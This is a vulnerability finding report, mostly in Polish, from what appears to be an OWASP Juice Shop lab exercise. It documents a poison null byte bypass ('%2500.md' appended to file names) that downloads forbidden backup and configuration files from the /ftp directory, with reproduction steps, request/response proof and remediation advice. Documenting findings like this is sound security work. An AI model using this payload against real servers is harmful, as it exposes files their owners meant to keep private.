\# File access control bypass via Poison Null Byte



\## Severity

High



\## Klasyfikacja

\- CWE-436: Interpretation Conflict

\- CWE-434: Unrestricted Upload of File with Dangerous Type

\- OWASP Top 10: A05 Security Misconfiguration

\- OWASP Juice Shop: Poison Null Byte



\## Opis

Kontrola dostępu do plików w katalogu /ftp opiera się na rozszerzeniu pliku.

Filtr można obejść przez dodanie zakodowanego null byte (%2500) oraz

dozwolonego rozszerzenia .md.



\## Kroki reprodukcji

1\. Otwórz http://localhost:3000/ftp

2\. Spróbuj pobrać /ftp/package.json.bak

3\. Otrzymaj odpowiedź 403 Forbidden

4\. Otwórz /ftp/package.json.bak%2500.md

5\. Otrzymaj odpowiedź 200 OK i pobierz plik



\## Dowód

Request:

GET /ftp/package.json.bak%2500.md



Response:

HTTP/1.1 200 OK

Content-Type: application/octet-stream

Content-Length: 4263



Request:

GET /ftp/suspicious\_errors.yml%2500.md



Response:

HTTP/1.1 200 OK

Content-Type: text/yml; charset=UTF-8

Content-Length: 723



\## Wpływ

Atakujący może pobrać pliki backup, konfiguracyjne i wewnętrzne, które mają

być niedostępne. Może to ujawnić wersję aplikacji, zależności, konfigurację

oraz informacje pomocne w dalszej eksploatacji.



\## Rekomendacja

1\. Nie opierać kontroli dostępu na rozszerzeniu pliku.

2\. Wdrożyć uwierzytelnienie i autoryzację dla całego katalogu /ftp.

3\. Usunąć backupy i pliki wewnętrzne z lokalizacji dostępnej przez WWW.

4\. Znormalizować i zdekodować URL przed walidacją ścieżki.

5\. Odrzucać żądania zawierające null byte.

6\. Domyślnie blokować dostęp do katalogów wewnętrznych.

